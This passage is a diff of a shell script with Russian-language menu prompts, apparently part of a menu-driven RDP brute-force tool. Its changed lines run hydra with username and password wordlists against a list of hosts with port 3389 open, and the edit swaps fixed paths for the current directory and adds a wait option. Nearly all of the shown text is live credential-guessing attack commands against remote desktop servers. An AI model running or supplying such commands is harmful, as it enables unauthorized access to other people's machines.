-hydra -L $loginlist -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -14423,7 +15235,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L /home/admin/opt/web/rdp_brute/users -P /home/admin/opt/web/rdp_brute/dictionary/pass -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
